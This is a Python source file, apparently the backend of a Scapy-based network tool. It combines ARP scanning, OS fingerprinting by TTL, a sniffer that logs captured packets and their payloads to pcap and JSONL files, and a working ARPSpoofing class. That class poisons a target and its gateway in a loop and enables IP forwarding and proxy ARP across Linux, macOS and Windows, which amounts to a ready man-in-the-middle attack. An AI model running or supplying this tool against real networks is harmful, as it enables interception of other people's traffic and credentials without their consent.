from scapy.all import srp, Ether, ARP, conf, sniff, IP, TCP, UDP, Raw, PcapWriter, send, sr1, ICMP, RandShort, sendp, get_if_hwaddr
from scapy.utils import PcapWriter
from scapy.data import ETHER_TYPES, MANUFDB
import socket
import platform
import subprocess
import json
from datetime import datetime
from threading import Thread, Event
import threading
from typing import List, Optional, Callable
import sys
import time
from getmac import get_mac_address

conf.use_pcap = True

# Simple in-memory cache to avoid excessive probing causing RTO/rate limiting
_OS_CACHE = {}
_OS_CACHE_TTL_SEC = 30  # cache per IP for 30 seconds

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def get_mac(ip):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=0)
    return ans[0][1].hwsrc

def get_gateway_ip():
    gateway = conf.route.route("0.0.0.0")[2]
    return gateway

def os_fingerprint(ip, iface: Optional[str] = None):
    """
    Fingerprint OS heuristically using TTL from ICMP Echo Reply or TCP responses.
    - First try ICMP echo (ping) with a slightly longer timeout.
    - If ICMP fails (RTO or blocked), fall back to TCP SYN on common ports.
    - If device is in the same LAN and ARP replies, consider host 'up' even if TTL couldn't be measured.
    """
    # Cache check
    try:
        cache = _OS_CACHE.get(ip)
        if cache and (time.time() - cache.get('ts', 0)) < _OS_CACHE_TTL_SEC:
            return cache['data']
    except Exception:
        pass

    # First, try ARP to quickly determine local reachability on the same LAN
    arp_reachable = False
    try:
        conf.verb = 0
        arp_ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=1.0, retry=0, iface=iface)
        if arp_ans and len(arp_ans) > 0:
            arp_reachable = True
    except Exception:
        print(f"[os_fingerprint] ARP scan failed for {ip}")
        # Ignore ARP errors; continue with ICMP/TCP methods
        pass
    def _ttl_to_guess(ttl: int):
        if ttl is None:
            return (None, None, "Unknown")
        if ttl > 128:
            initial = 255
        elif ttl > 64:
            initial = 128
        else:
            initial = 64
        hops = initial - ttl if ttl is not None else None
        os_guess = "Unknown"
        if initial == 64:
            os_guess = "Linux/Unix/Mac"
        elif initial == 128:
            os_guess = "Windows"
        elif initial == 255:
            os_guess = "Network Devices"
        return (initial, hops, os_guess)

    try:
        # Try ICMP echo first (some systems block ICMP; increase timeout & allow 2 attempts)
        icmp_pkt = IP(dst=ip)/ICMP()
        ans = sr1(icmp_pkt, timeout=1.5, verbose=False, iface=iface)
        if not ans:
            # Second attempt in case of transient loss
            ans = sr1(icmp_pkt, timeout=1.5, verbose=False, iface=iface)

        if ans:
            icmp_layer = ans.getlayer(ICMP)
            if icmp_layer and icmp_layer.type == 0:  # Echo reply
                ttl = getattr(ans, 'ttl', None)
                initial_ttl, hops, os_guess = _ttl_to_guess(ttl)
                result = {
                    'ip': ip,
                    'ttl': ttl,
                    'initial_ttl': initial_ttl,
                    'hops': hops,
                    'os': os_guess,
                    'status': 'up'
                }
                _OS_CACHE[ip] = { 'ts': time.time(), 'data': result }
                return result
            elif icmp_layer and icmp_layer.type == 3:  # Destination unreachable
                # Keep legacy status string used by frontend
                result = {'ip': ip, 'status': 'uncherable'}
                _OS_CACHE[ip] = { 'ts': time.time(), 'data': result }
                return result

        # Fallback: TCP SYN to common ports; even RST implies host is up
        for dport in (443, 80, 22, 53, 445, 139):
            tcp_pkt = IP(dst=ip)/TCP(sport=RandShort(), dport=dport, flags='S')
            resp = sr1(tcp_pkt, timeout=1.5, verbose=False, iface=iface)
            if not resp:
                continue
            ttl = getattr(resp, 'ttl', None)
            initial_ttl, hops, os_guess = _ttl_to_guess(ttl)
            # Check flags: SA (open) or RA/R (closed) still means host reachable
            tcp_layer = resp.getlayer(TCP)
            if tcp_layer:
                flags = tcp_layer.flags
                # Responded: consider host up
                result = {
                    'ip': ip,
                    'ttl': ttl,
                    'initial_ttl': initial_ttl,
                    'hops': hops,
                    'os': os_guess,
                    'status': 'up',
                    'port': dport,
                    'tcp_flags': int(flags)
                }
                _OS_CACHE[ip] = { 'ts': time.time(), 'data': result }
                return result

        # If ARP responded but we couldn't get TTL via ICMP/TCP, still mark host as up
        if arp_reachable:
            result = {
                'ip': ip,
                'ttl': None,
                'initial_ttl': None,
                'hops': None,
                'os': 'Unknown',
                'status': 'up'
            }
            _OS_CACHE[ip] = { 'ts': time.time(), 'data': result }
            return result

        # No response from ICMP or TCP (and ARP didn't respond)
        result = {'ip': ip, 'status': 'down'}
        _OS_CACHE[ip] = { 'ts': time.time(), 'data': result }
        return result
    except Exception as e:
        result = {'ip': ip, 'status': 'error', 'error': str(e)}
        _OS_CACHE[ip] = { 'ts': time.time(), 'data': result }
        return result

def get_hostname(ip):
    try:
        hstnm = socket.gethostbyaddr(ip)[0]
        return hstnm
    except:
        return "Unknown"

def get_vendor_mac(mac):
    try:
        vendor = MANUFDB.get(mac, "Unknown")
        return vendor
    except:
        return "Unknown"

def scapy_arp_scan(timeout=2, iface=None):
    """
    Lakukan ARP scan ke /24 berdasarkan IP lokal. memerlukan root
    Return List of {'ip': ..., 'mac': ...}
    """
    conf.verb = 0
    try: 
        local_ip = get_local_ip()
    except Exception:
        return []
    parts = local_ip.split('.')
    network = '.'.join(parts[:3]) + '.0/24'
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=timeout, iface=iface, inter=0.1)
    
    results = []
    for _, rcv in ans:
        results.append({'ip': rcv.psrc, 'mac': rcv.hwsrc})
    return results

class IPSniffer:
    """
    IPSniffer: sniff traffic involving specified IP(s), write to pcap/jsonl and print summary.

    Usage:
        s = IPSniffer(iface="eth0", ips=["192.168.1.10"], pcap_path="out.pcap", jsonl_path="out.jsonl")
        t = s.start(background=True)   # returns Thread
        # ... later ...
        s.stop()    # signal to stop
        t.join()
    """

    def __init__(self,
                 iface: Optional[str],
                 ips: List[str],
                 pcap_path: Optional[str] = None,
                 jsonl_path: Optional[str] = None,
                 bpf: bool = True,
                 on_packet: Optional[Callable] = None):
        self.iface = iface
        self.ips = ips or []
        self._target_set = set(self.ips)
        self.pcap_path = pcap_path
        self.jsonl_path = jsonl_path
        self.bpf_enabled = bpf and bool(self.ips)
        self.on_packet = on_packet

        # Stop control
        self._running = False
        self._stop_event = Event()
        self._stop_sniffing = False  # Additional flag for double-check
        self._thread = None
        self._packet_count = 0

        # writers
        self._pw: Optional[PcapWriter] = None
        if self.pcap_path:
            try:
                self._pw = PcapWriter(self.pcap_path, append=True, sync=True)
            except Exception as e:
                print(f"[IPSniffer] Warning: failed to open pcap writer: {e}", file=sys.stderr)
                self._pw = None

        self._json_fd = None
        if self.jsonl_path:
            try:
                self._json_fd = open(self.jsonl_path, "a", encoding="utf-8")
            except Exception as e:
                print(f"[IPSniffer] Warning: failed to open jsonl file: {e}", file=sys.stderr)
                self._json_fd = None

    @staticmethod
    def _build_bpf_for_ips(ips: List[str]) -> str:
        if not ips:
            return ""
        return " or ".join(f"host {ip}" for ip in ips)

    @staticmethod
    def _short_payload(payload: bytes, length: int = 300) -> str:
        try:
            return payload.decode("utf-8", errors="replace")[:length]
        except Exception:
            return "<binary>"

    def _packet_summary(self, pkt) -> dict:
        ts = datetime.utcnow().isoformat() + "Z"
        summary = {"ts": ts}
        if IP in pkt:
            ip_layer = pkt[IP]
            summary.update({
                "src": ip_layer.src,
                "dst": ip_layer.dst,
                "proto": ip_layer.proto,
            })
            if pkt.haslayer(TCP):
                summary.update({"sport": pkt[TCP].sport, "dport": pkt[TCP].dport, "l4": "TCP"})
            elif pkt.haslayer(UDP):
                summary.update({"sport": pkt[UDP].sport, "dport": pkt[UDP].dport, "l4": "UDP"})
            if pkt.haslayer(Raw):
                summary["payload"] = self._short_payload(pkt[Raw].load, 300)
        else:
            summary["info"] = pkt.summary()

        summary["target_involved"] = (summary.get("src") in self._target_set) or (summary.get("dst") in self._target_set)
        return summary

    def _should_stop_packet(self, pkt) -> bool:
        """
        Stop filter function for scapy sniff()
        Returns True to stop sniffing
        """
        return self._stop_sniffing or self._stop_event.is_set()

    def _prn(self, pkt):
        # Check stop condition first
        if self._should_stop_packet(pkt):
            return True  # Signal to stop

        try:
            summ = self._packet_summary(pkt)
        except Exception as e:
            print(f"[IPSniffer] Error building summary: {e}", file=sys.stderr)
            return

        if not summ.get("target_involved"):
            return

        self._packet_count += 1

        # print concise summary
        src = summ.get("src", "n/a")
        dst = summ.get("dst", "n/a")
        proto = summ.get("l4", summ.get("proto"))
        sport = summ.get("sport")
        dport = summ.get("dport")
        line = f"[{self._packet_count}] {summ['ts']} {src} -> {dst} proto={proto}"
        if sport is not None and dport is not None:
            line += f" {sport}->{dport}"
        print(line, flush=True)

        # write to pcap if available
        if self._pw:
            try:
                self._pw.write(pkt)
            except Exception as e:
                print(f"[IPSniffer] Failed to write pcap: {e}", file=sys.stderr)

        # write to jsonl if available
        if self._json_fd:
            try:
                self._json_fd.write(json.dumps(summ, ensure_ascii=False) + "\n")
                self._json_fd.flush()
            except Exception as e:
                print(f"[IPSniffer] Failed to append jsonl: {e}", file=sys.stderr)
        
        # Call callback (non-blocking if callback quick)
        if self.on_packet:
            try:
                self.on_packet(summ)
            except Exception as e:
                print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)

    def _sniff_loop(self, timeout: Optional[int], count: int):
        """
        Internal sniff loop with improved stop mechanism
        """
        print(f"[IPSniffer] Starting sniff loop on {self.iface} for IPs: {self.ips}")
        
        bpf_filter = ""
        if self.bpf_enabled:
            bpf_filter = self._build_bpf_for_ips(self.ips)
            if bpf_filter:
                print(f"[IPSniffer] Using BPF filter: {bpf_filter}")

        sniff_kwargs = {
            "iface": self.iface,
            "prn": self._prn,
            "store": False,
            "stop_filter": self._should_stop_packet,  # KEY: This enables stopping
        }
        
        if bpf_filter:
            sniff_kwargs["filter"] = bpf_filter

        self._running = True
        self._stop_sniffing = False
        start_time = time.time()
        
        try:
            # Calculate end time if timeout is set
            end_time = None
            if timeout is not None and timeout > 0:
                end_time = start_time + float(timeout)

            while not self._stop_event.is_set() and not self._stop_sniffing:
                # Check global timeout
                if end_time and time.time() >= end_time:
                    print("[IPSniffer] Global timeout reached")
                    break

                # Calculate remaining time for this chunk
                chunk_timeout = 2.0  # Short chunks for responsiveness
                if end_time:
                    remaining = end_time - time.time()
                    if remaining <= 0:
                        break
                    chunk_timeout = min(chunk_timeout, max(0.5, remaining))

                print(f"[IPSniffer] Sniffing chunk (timeout={chunk_timeout:.1f}s)...", flush=True)
                
                try:
                    # Sniff with timeout for this chunk
                    sniff(timeout=chunk_timeout, **sniff_kwargs)
                    
                    # Check stop condition after each chunk
                    if self._stop_event.is_set() or self._stop_sniffing:
                        print("[IPSniffer] Stop signal detected after chunk")
                        break
                        
                except KeyboardInterrupt:
                    print("[IPSniffer] KeyboardInterrupt received")
                    break
                    
                except Exception as e:
                    print(f"[IPSniffer] sniff() raised: {e}", file=sys.stderr)
                    if self.bpf_enabled and "filter" in str(e).lower():
                        # BPF filter error — retry without filter
                        print("[IPSniffer] Retrying without BPF filter", file=sys.stderr)
                        self.bpf_enabled = False
                        sniff_kwargs.pop("filter", None)
                        continue
                    else:
                        # Unrecoverable error
                        print("[IPSniffer] Unrecoverable error, stopping", file=sys.stderr)
                        break

        except Exception as e:
            print(f"[IPSniffer] Unexpected error in sniff loop: {e}", file=sys.stderr)
            
        finally:
            self._running = False
            self._stop_sniffing = True
            self.close()
            elapsed = time.time() - start_time
            print(f"[IPSniffer] Sniffing stopped. Captured {self._packet_count} packets in {elapsed:.1f}s", flush=True)

    def start(self, timeout: Optional[int] = None, count: int = 0, background: bool = False) -> Optional[Thread]:
        """
        Start sniffing.
        - timeout: total seconds to run (None = indefinite)
        - count: (currently unused) reserved for future matched-packet stop
        - background: if True, runs in a daemon Thread and returns the Thread object
        """
        if self._running:
            print("[IPSniffer] Warning: already running", file=sys.stderr)
            return self._thread
            
        if not self.ips:
            print("[IPSniffer] Warning: no target IPs specified; will match all traffic", file=sys.stderr)

        self._stop_event.clear()
        self._stop_sniffing = False
        self._packet_count = 0
        
        if background:
            self._thread = Thread(target=self._sniff_loop, args=(timeout, count), daemon=False)
            self._thread.start()
            print(f"[IPSniffer] Started in background (thread: {self._thread.name})")
            return self._thread
        else:
            self._sniff_loop(timeout, count)
            return None

    def stop(self):
        """
        Signal the sniffer to stop (safe to call from another thread).
        This is thread-safe and will cause sniff() to exit.
        """
        if not self._running:
            print("[IPSniffer] Already stopped or not running")
            return
            
        print("[IPSniffer] Stop requested - setting flags...")
        self._stop_sniffing = True
        self._stop_event.set()
        
        # Give it a moment to process the stop signal
        if self._thread and self._thread.is_alive():
            print(f"[IPSniffer] Waiting for thread to finish (max 5s)...")
            self._thread.join(timeout=5)
            
            if self._thread.is_alive():
                print("[IPSniffer] Warning: thread still alive after timeout")
            else:
                print("[IPSniffer] Thread stopped successfully")

    def close(self):
        """Close writers and cleanup."""
        print("[IPSniffer] Closing writers...")
        try:
            if self._pw:
                try:
                    self._pw.flush()
                    self._pw.close()
                    print("[IPSniffer] PCAP writer closed")
                except Exception as e:
                    print(f"[IPSniffer] Error closing PCAP: {e}", file=sys.stderr)
                finally:
                    self._pw = None
        finally:
            if self._json_fd:
                try:
                    self._json_fd.flush()
                    self._json_fd.close()
                    print("[IPSniffer] JSONL writer closed")
                except Exception as e:
                    print(f"[IPSniffer] Error closing JSONL: {e}", file=sys.stderr)
                finally:
                    self._json_fd = None

    @property
    def is_running(self) -> bool:
        return self._running
    
    @property
    def packet_count(self) -> int:
        return self._packet_count
    
class ARPSpoofing:
    def __init__(self,
        target_ip: str, # IP Target
        gateway_ip: str, # IP Gateway
        iface: Optional[str] = None, # Network interface, jika tidak ada set dfault None
        interval: float = 2.0,
        on_packet: Optional[Callable] = None):

        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = iface
        self.interval = interval
        self.on_packet = on_packet
        
        # Var untuk menyimpan MAC
        self.target_mac = None
        self.gateway_mac = None
        self.attacker_mac = None
        
        # Control Flags
        self._running = False
        self._poisoned = False
        
        # Threading
        self._thread = None
        self._lock = threading.Lock()

        # OS-specific toggles we may modify and need to restore
        self._proxy_arp_prev: Optional[int] = None
        self._proxy_arp_changed: bool = False
        
        conf.verb = 0
        
        print("[ARPSpoofing] initialized ✓ ")
        print(f"Target IP: {self.target_ip}")
        print(f"Gateway IP: {self.gateway_ip}")
        print(f"Interface: {self.iface}")
        
    def _log(self, message: str):
        """Helper untuk logging dengan callback"""
        print(message)
        if self.on_packet:
            try:
                self.on_packet(message)
            except Exception as e:
                print(f"[ARPSpoofing] on_packet callback error: {e}", file=sys.stderr)

        
    def _spoof(self, target_ip: str, spoof_ip: str, target_mac: str):
        """Kirim ARP 'is-at' yang memberitahu target bahwa spoof_ip berada pada MAC penyerang."""
        # Tentukan MAC penyerang (hwsrc) secara eksplisit
        hwsrc_val = self.attacker_mac
        try:
            if not hwsrc_val and self.iface:
                hwsrc_val = get_if_hwaddr(self.iface)
        except Exception:
            hwsrc_val = None

        arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=hwsrc_val)
        eth = Ether(dst=target_mac)
        sendp(eth/arp, iface=self.iface, verbose=False)
     
    def _restore(self, dest_ip: str, source_ip: str, dest_mac: str, source_mac: str):   
        packet = ARP(op=2, # ARP reply
                     pdst=dest_ip, # Target IP
                     hwdst=dest_mac, # Target MAC
                     psrc=source_ip, #source ip
                     hwsrc=source_mac) #source mac
        
        send(packet, iface=self.iface, count = 5, verbose=False)
    
    def enable_ip_forwarding(self): 
        """Enable IP forwarding based on OS (Linux/macOS/Windows). Requires admin/sudo.
        - Linux: /proc or sysctl net.ipv4.ip_forward=1
        - macOS: sysctl net.inet.ip.forwarding=1
        - Windows: PowerShell Set-NetIPInterface -Forwarding Enabled (requires admin) or registry IPEnableRouter=1
        """
        os_name = platform.system()
        try:
            if os_name == "Linux":
                try:
                    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                        f.write("1\n")
                    self._log("[ARPSpoofing] ✓ IP forwarding enabled (Linux /proc)")
                    return True
                except Exception:
                    # Fallback to sysctl
                    result = subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True, text=True)
                    if result.returncode == 0:
                        self._log("[ARPSpoofing] ✓ IP forwarding enabled (Linux sysctl)")
                        return True
                    else:
                        raise RuntimeError(result.stderr.strip() or "sysctl failed")

            elif os_name == "Darwin":  # macOS
                result = subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"], capture_output=True, text=True)
                if result.returncode == 0:
                    self._log("[ARPSpoofing] ✓ IP forwarding enabled (macOS)")
                    return True
                else:
                    raise RuntimeError(result.stderr.strip() or "sysctl failed")

            elif os_name == "Windows":
                # Try PowerShell (enable forwarding for all IPv4 interfaces)
                ps_cmd = (
                    "powershell",
                    "-Command",
                    "Get-NetIPInterface | Where-Object {$_.AddressFamily -eq 'IPv4'} | Set-NetIPInterface -Forwarding Enabled"
                )
                result = subprocess.run(ps_cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    self._log("[ARPSpoofing] ✓ IP forwarding enabled (Windows PowerShell)")
                    return True
                # Fallback: set registry IPEnableRouter=1 (requires admin, reboot/service restart)
                reg_cmd = (
                    "reg",
                    "add",
                    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
                    "/v",
                    "IPEnableRouter",
                    "/t",
                    "REG_DWORD",
                    "/d",
                    "1",
                    "/f"
                )
                result2 = subprocess.run(reg_cmd, capture_output=True, text=True)
                if result2.returncode == 0:
                    self._log("[ARPSpoofing] ✓ IP forwarding registry key set (Windows). You may need to restart or enable Routing and Remote Access service.")
                    return True
                else:
                    raise RuntimeError(result2.stderr.strip() or "Windows registry update failed")
            else:
                raise RuntimeError(f"Unsupported OS for IP forwarding: {os_name}")

        except Exception as e:
            self._log(f"[ARPSpoofing] ✗ Failed to enable IP forwarding on {os_name}: {e}")
            if os_name == "Linux":
                self._log("  Try manually: sudo sysctl -w net.ipv4.ip_forward=1")
            elif os_name == "Darwin":
                self._log("  Try manually (macOS): sudo sysctl -w net.inet.ip.forwarding=1")
            elif os_name == "Windows":
                self._log("  Try manually (Windows PowerShell as Admin): Get-NetIPInterface | Where-Object {$_.AddressFamily -eq 'IPv4'} | Set-NetIPInterface -Forwarding Enabled")
                self._log("  Or set registry (Admin): reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f")
            return False

    def enable_proxy_arp(self) -> bool:
        """Enable proxy ARP on macOS (Darwin). Store previous value to restore later.
        Returns True on success or already enabled, False on failure or unsupported OS.
        """
        try:
            if platform.system() != "Darwin":
                return False
            # Read current value
            cur = subprocess.run(["sysctl", "net.link.ether.inet.proxy_arp"], capture_output=True, text=True)
            if cur.returncode == 0 and ":" in cur.stdout:
                try:
                    self._proxy_arp_prev = int(cur.stdout.strip().split(":")[-1].strip())
                except Exception:
                    self._proxy_arp_prev = None
            # If already enabled
            if self._proxy_arp_prev == 1:
                self._log("[ARPSpoofing] ✓ Proxy ARP already enabled (macOS)")
                self._proxy_arp_changed = False
                return True
            # Try to enable
            result = subprocess.run(["sysctl", "-w", "net.link.ether.inet.proxy_arp=1"], capture_output=True, text=True)
            if result.returncode == 0:
                self._log("[ARPSpoofing] ✓ Proxy ARP enabled (macOS)")
                self._proxy_arp_changed = True
                return True
            else:
                raise RuntimeError(result.stderr.strip() or "sysctl failed")
        except Exception as e:
            self._log(f"[ARPSpoofing] ✗ Failed to enable proxy ARP (macOS): {e}")
            self._log("  Try manually (macOS): sudo sysctl -w net.link.ether.inet.proxy_arp=1")
            return False

    def disable_proxy_arp(self) -> bool:
        """Restore proxy ARP on macOS to previous value or disable if we changed it."""
        try:
            if platform.system() != "Darwin":
                return False
            # If we didn't change it, nothing to do
            if not self._proxy_arp_changed:
                return True
            target_val = 0 if self._proxy_arp_prev is None else int(self._proxy_arp_prev)
            result = subprocess.run(["sysctl", "-w", f"net.link.ether.inet.proxy_arp={target_val}"], capture_output=True, text=True)
            if result.returncode == 0:
                if target_val == 1:
                    self._log("[ARPSpoofing] ✓ Proxy ARP restored to 1 (macOS)")
                else:
                    self._log("[ARPSpoofing] ✓ Proxy ARP disabled (macOS)")
                self._proxy_arp_changed = False
                return True
            else:
                raise RuntimeError(result.stderr.strip() or "sysctl failed")
        except Exception as e:
            self._log(f"[ARPSpoofing] ✗ Failed to restore proxy ARP (macOS): {e}")
            self._log("  Try manually (macOS): sudo sysctl -w net.link.ether.inet.proxy_arp=0")
            return False
    
    def disable_ip_forwarding(self):
        """Disable IP forwarding based on OS."""
        os_name = platform.system()
        try:
            if os_name == "Linux":
                try:
                    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                        f.write("0\n")
                    self._log("[ARPSpoofing] ✓ IP forwarding disabled (Linux /proc)")
                    return True
                except Exception:
                    result = subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True, text=True)
                    if result.returncode == 0:
                        self._log("[ARPSpoofing] ✓ IP forwarding disabled (Linux sysctl)")
                        return True
                    else:
                        raise RuntimeError(result.stderr.strip() or "sysctl failed")
            elif os_name == "Darwin":
                result = subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=0"], capture_output=True, text=True)
                if result.returncode == 0:
                    self._log("[ARPSpoofing] ✓ IP forwarding disabled (macOS)")
                    return True
                else:
                    raise RuntimeError(result.stderr.strip() or "sysctl failed")
            elif os_name == "Windows":
                ps_cmd = (
                    "powershell",
                    "-Command",
                    "Get-NetIPInterface | Where-Object {$_.AddressFamily -eq 'IPv4'} | Set-NetIPInterface -Forwarding Disabled"
                )
                result = subprocess.run(ps_cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    self._log("[ARPSpoofing] ✓ IP forwarding disabled (Windows PowerShell)")
                    return True
                reg_cmd = (
                    "reg",
                    "add",
                    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
                    "/v",
                    "IPEnableRouter",
                    "/t",
                    "REG_DWORD",
                    "/d",
                    "0",
                    "/f"
                )
                result2 = subprocess.run(reg_cmd, capture_output=True, text=True)
                if result2.returncode == 0:
                    self._log("[ARPSpoofing] ✓ IP forwarding registry key set to 0 (Windows). You may need to restart or stop Routing and Remote Access service.")
                    return True
                else:
                    raise RuntimeError(result2.stderr.strip() or "Windows registry update failed")
            else:
                raise RuntimeError(f"Unsupported OS for IP forwarding: {os_name}")
        except Exception as e:
            self._log(f"[ARPSpoofing] ✗ Failed to disable IP forwarding on {os_name}: {e}")
            if os_name == "Linux":
                self._log("  Try manually: sudo sysctl -w net.ipv4.ip_forward=0")
            elif os_name == "Darwin":
                self._log("  Try manually (macOS): sudo sysctl -w net.inet.ip.forwarding=0")
            elif os_name == "Windows":
                self._log("  Try manually (Windows PowerShell as Admin): Get-NetIPInterface | Where-Object {$_.AddressFamily -eq 'IPv4'} | Set-NetIPInterface -Forwarding Disabled")
                self._log("  Or set registry (Admin): reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 0 /f")
            return False
    
    def _poison_loop(self):
        """Loop poisoning yang berjalan di thread terpisah"""
        packet_count = 0
        
        while self._running:
            try:
                # Poison target: beritahu target bahwa gateway_ip adalah MAC kita
                self._spoof(self.target_ip, self.gateway_ip, self.target_mac)
                print(f"[ARPSpoofing] Telling {self.target_ip} that {self.gateway_ip} is-at {self.attacker_mac} (dst {self.target_mac})")
                self._log(f"[ARPSpoofing] ✓ Telling {self.target_ip} that {self.gateway_ip} is-at {self.attacker_mac} (dst {self.target_mac})")
                # Poison gateway: beritahu gateway bahwa target_ip adalah MAC kita
                self._spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
                print(f"[ARPSpoofing] Telling {self.gateway_ip} that {self.target_ip} is-at {self.attacker_mac} (dst {self.gateway_mac})")
                self._log(f"[ARPSpoofing] ✓ Telling {self.gateway_ip} that {self.target_ip} is-at {self.attacker_mac} (dst {self.gateway_mac})")
                
                packet_count += 2
                self._log(f"[ARPSpoofing] Sent {packet_count} ARP packets...")
                
                time.sleep(self.interval)
                
            except Exception as e:
                self._log(f"[ARPSpoofing] Error in poison loop: {e}")
                break
        
        self._log("[ARPSpoofing] Poison loop stopped")
    
    def start(self, enable_forwarding: bool = True, background: bool = True) -> dict:
        with self._lock:
            if self._running:
                return {
                    "success": False,
                    "message": "ARP spoofing already running",
                    "is_running": True,
                    "thread": self._thread
                }

            self._log("\\n[ARPSpoofing] Starting ARP poisoning attack...")

            # Get MAC addresses
            self.target_mac = str(get_mac_address(ip=str(self.target_ip), network_request=True))
            self.gateway_mac = str(get_mac_address(ip=str(self.gateway_ip), network_request=True))
            # Ambil MAC penyerang dari interface aktif jika tersedia
            try:
                if self.iface:
                    self.attacker_mac = str(get_mac_address(interface=str(self.iface)))
            except Exception:
                self.attacker_mac = None

            if not self.target_mac or self.target_mac == "None":
                msg = f"Could not find target MAC for {self.target_ip}"
                self._log(f"[ARPSpoofing] ✗ {msg}")
                return {
                    "success": False,
                    "message": msg,
                    "is_running": False,
                    "thread": None
                }

            if not self.gateway_mac or self.gateway_mac == "None":
                msg = f"Could not find gateway MAC for {self.gateway_ip}"
                self._log(f"[ARPSpoofing] ✗ {msg}")
                return {
                    "success": False,
                    "message": msg,
                    "is_running": False,
                    "thread": None
                }

            # Enable IP forwarding (best-effort; continue even if failed, e.g., on macOS)
            if enable_forwarding:
                ok = self.enable_ip_forwarding()
                if ok is False:
                    self._log("[ARPSpoofing] ⚠ Continuing without IP forwarding (may limit packet routing)")
            # macOS: enable proxy ARP to improve MITM stability on same-LAN
            self.enable_proxy_arp()

            # Set flags
            self._running = True
            self._poisoned = True

            if background:
                # Start thread
                self._thread = threading.Thread(
                    target=self._poison_loop,
                    daemon=True,
                    name=f"ARP-{self.target_ip}"
                )
                self._thread.start()

                self._log(f"\\n[ARPSpoofing] ✓ Poisoning started in background thread!")
                self._log(f"  Target: {self.target_ip} ({self.target_mac})")
                self._log(f"  Gateway: {self.gateway_ip} ({self.gateway_mac})")
                if self.attacker_mac:
                    self._log(f"  Attacker MAC: {self.attacker_mac} (iface: {self.iface})")
                self._log(f"  Interval: {self.interval}s")

                return {
                    "success": True,
                    "message": "ARP spoofing started successfully",
                    "is_running": True,
                    "target_ip": self.target_ip,
                    "target_mac": self.target_mac,
                    "gateway_ip": self.gateway_ip,
                    "gateway_mac": self.gateway_mac,
                    "interval": self.interval,
                    "thread": self._thread  # Return thread object
                }
            else:
                # Blocking mode
                self._log(f"\\n[ARPSpoofing] ✓ Starting poisoning (blocking mode)...")
                try:
                    self._poison_loop()
                except KeyboardInterrupt:
                    self._log("\\n[ARPSpoofing] Interrupted by user")
                finally:
                    self.stop()

                return {
                    "success": True,
                    "message": "ARP spoofing completed",
                    "is_running": False,
                    "thread": None
                }

    
    def stop(self) -> dict:
        with self._lock:
            if not self._running and not self._poisoned:
                return {
                    "success": False,
                    "message": "ARP spoofing not running",
                    "is_running": False
                }

            self._log("\\n[ARPSpoofing] Stopping ARP poisoning...")

            # Stop the loop
            self._running = False

            # Wait for thread to finish (with timeout)
            if self._thread and self._thread.is_alive():
                self._thread.join(timeout=5)

            # Restore ARP tables
            if self._poisoned and self.target_mac and self.gateway_mac:
                self._log("[ARPSpoofing] Restoring ARP tables...")

                # Restore target's ARP table
                self._log(f"  Restoring {self.target_ip}'s ARP table...")
                self._restore(self.target_ip, self.gateway_ip,
                            self.target_mac, self.gateway_mac)

                # Restore gateway's ARP table
                self._log(f"  Restoring {self.gateway_ip}'s ARP table...")
                self._restore(self.gateway_ip, self.target_ip,
                            self.gateway_mac, self.target_mac)

                self._log("[ARPSpoofing] ✓ ARP tables restored")
                self._poisoned = False

            self._log("[ARPSpoofing] ✓ Stopped successfully")

            # Restore OS toggles
            self.disable_proxy_arp()
            # Best-effort: try disable IP forwarding back (optional)
            try:
                self.disable_ip_forwarding()
            except Exception:
                pass

            return {
                "success": True,
                "message": "ARP spoofing stopped and ARP tables restored",
                "is_running": False
            }

    def status(self) -> dict:
        return {
            "is_running": self._running,
            "is_poisoned": self._poisoned,
            "target_ip": self.target_ip,
            "target_mac": self.target_mac,
            "gateway_ip": self.gateway_ip,
            "gateway_mac": self.gateway_mac,
            "interval": self.interval,
            "thread_alive": self._thread.is_alive() if self._thread else False
        }

    @property
    def is_running(self) -> bool:
        return self._running
    
if __name__ == "__main__":
    # Test ARP scan
    print("Testing ARP scan...")
    results = scapy_arp_scan()
    print(f"Found {len(results)} devices:")
    for r in results:
        print(f"  {r['ip']} - {r['mac']}")
    
    # Test IP sniffer (uncomment to test)
    # print("\nTesting IP Sniffer (Ctrl+C to stop)...")
    # sniffer = IPSniffer(iface="eth0", ips=["192.168.1.1"])
    # thread = sniffer.start(timeout=10, background=True)
    # 
    # import time
    # time.sleep(5)
    # print("Stopping sniffer...")
    # sniffer.stop()
    # thread.join()
    # print(f"Captured {sniffer.packet_count} packets")